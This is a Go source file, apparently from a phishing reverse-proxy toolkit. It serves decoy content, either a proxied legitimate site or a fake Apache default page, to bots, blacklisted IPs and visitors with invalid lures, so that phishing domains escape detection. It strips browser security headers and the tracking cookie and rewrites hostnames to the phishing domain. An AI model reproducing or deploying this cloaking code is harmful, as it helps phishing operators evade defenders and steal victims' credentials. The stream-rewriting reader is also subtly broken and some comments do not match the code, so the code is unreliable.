// Package spoof serves decoy content at phishing domains to hide the proxy's
// true purpose. When a visitor should not be phished (bot, blacklisted IP,
// invalid lure), the Server reverse-proxies a legitimate site's content or
// serves a default "It works!" page, making the server appear to host real content.
package spoof

import (
	"bytes"
	_ "embed"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"
)

//go:embed default.html
var defaultPage []byte

// securityHeaders lists HTTP headers that are stripped from spoofed responses
// to prevent the browser from enforcing policies that would interfere with
// the spoof. Exported so the proxy package can reuse the same list.
var securityHeaders = []string{
	"Content-Security-Policy",
	"Content-Security-Policy-Report-Only",
	"Strict-Transport-Security",
	"X-Frame-Options",
	"X-Content-Type-Options",
	"X-XSS-Protection",
	"Expect-CT",
	"Cross-Origin-Embedder-Policy",
	"Cross-Origin-Opener-Policy",
	"Cross-Origin-Resource-Policy",
	"Permissions-Policy",
}

// Server renders a legitimate site's content in place of a phishing response.
// It rewrites domain references in the response body so the spoofed site's
// links point to the phishing domain, strips security headers, and removes
// the session tracking cookie.
//
// When no spoof URL is configured, ServeHTTP serves an Apache-style default
// page — a 200 OK that makes the server look like an ordinary unconfigured
// web host.
type Server struct {
	defaultSpoofURL   string
	sessionCookieName string
	logger            *slog.Logger
	transport         *http.Transport
}

// New creates a Server. defaultSpoofURL is used when no per-request URL is
// provided. sessionCookieName is the cookie stripped from spoofed requests.
func NewServer(defaultSpoofURL, sessionCookieName string, logger *slog.Logger) *Server {
	return &Server{
		defaultSpoofURL:   defaultSpoofURL,
		sessionCookieName: sessionCookieName,
		logger:            logger,
		transport: &http.Transport{
			ResponseHeaderTimeout: 10 * time.Second,
			IdleConnTimeout:       30 * time.Second,
		},
	}
}

// Spoof serves the default spoof URL, or the default page if none is configured.
func (s *Server) Spoof(w http.ResponseWriter, r *http.Request) {
	s.SpoofTarget(w, r, "")
}

// SpoofTarget serves the provided URL, falling back to the default spoof URL,
// and finally to the default page if neither is available.
func (s *Server) SpoofTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
	if spoofURL == "" {
		spoofURL = s.defaultSpoofURL
	}
	if spoofURL == "" {
		serveDefaultPage(w)
		return
	}

	target, err := url.Parse(spoofURL)
	if err != nil {
		s.logger.Error("spoof: invalid URL", "url", spoofURL, "error", err)
		serveDefaultPage(w)
		return
	}

	phishingHost := r.Host
	cookieName := s.sessionCookieName
	rp := &httputil.ReverseProxy{
		Rewrite: func(pr *httputil.ProxyRequest) {
			pr.SetURL(target)
			pr.Out.Host = target.Host

			if referer := pr.In.Header.Get("Referer"); referer != "" {
				pr.Out.Header.Set("Referer", rewriteHost(referer, target.Host))
			}
			stripCookie(pr.Out, cookieName)
		},
		Transport: s.transport,
		ModifyResponse: func(resp *http.Response) error {
			for _, name := range securityHeaders {
				resp.Header.Del(name)
			}
			if isRewritable(resp.Header.Get("Content-Type")) {
				resp.Body = rewriteBody(resp.Body, target.Host, phishingHost)
			}
			return nil
		},
		ErrorHandler: func(w http.ResponseWriter, _ *http.Request, err error) {
			s.logger.Warn("spoof: upstream error", "url", spoofURL, "error", err)
			serveDefaultPage(w)
		},
	}

	rp.ServeHTTP(w, r)
}

func serveDefaultPage(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write(defaultPage)
}

func rewriteHost(rawURL, newHost string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	parsed.Host = newHost
	return parsed.String()
}

func stripCookie(r *http.Request, name string) {
	cookies := r.Cookies()
	r.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			r.AddCookie(cookie)
		}
	}
}

func isRewritable(contentType string) bool {
	for _, prefix := range []string{
		"text/html", "text/css", "text/javascript",
		"application/javascript", "application/json",
		"application/x-javascript", "image/svg+xml",
	} {
		if strings.HasPrefix(contentType, prefix) {
			return true
		}
	}
	return false
}

func rewriteBody(body io.ReadCloser, fromHost, toHost string) io.ReadCloser {
	return &rewriteReader{
		r:    body,
		from: []byte(fromHost),
		to:   []byte(toHost),
	}
}

type rewriteReader struct {
	r    io.ReadCloser
	from []byte
	to   []byte
}

func (rr *rewriteReader) Read(p []byte) (int, error) {
	n, err := rr.r.Read(p)
	if n > 0 {
		replaced := bytes.ReplaceAll(p[:n], rr.from, rr.to)
		copy(p, replaced)
		return len(replaced), err
	}
	return n, err
}

func (rr *rewriteReader) Close() error { return rr.r.Close() }
